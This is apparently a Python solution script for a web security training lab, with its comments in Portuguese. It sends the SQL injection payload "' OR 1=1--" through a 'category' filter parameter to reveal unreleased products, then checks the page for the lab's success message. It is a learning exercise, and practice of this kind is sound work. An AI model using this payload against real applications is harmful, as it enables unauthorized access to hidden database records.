"""
Lab: SQL Injection vulnerability in WHERE clause allowing retrieval of hidden data

Objetivo:
Explorar uma SQL Injection no parâmetro 'category' para retornar produtos ocultos (released = 0).
"""

import requests

GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

PAYLOAD = "' OR 1=1--"

target_url = input("URL do laboratório: ").rstrip("/")

session = requests.Session()

session.get(
    f"{target_url}/filter",
    params={"category": f"Gifts{PAYLOAD}"}
)

check = session.get(target_url)

if "Congratulations" in check.text:
    print(f"{GREEN}[+] Vulnerabilidade explorada.{RESET}")
else:
    print(f"{RED}[-] Exploração não confirmada.{RESET}")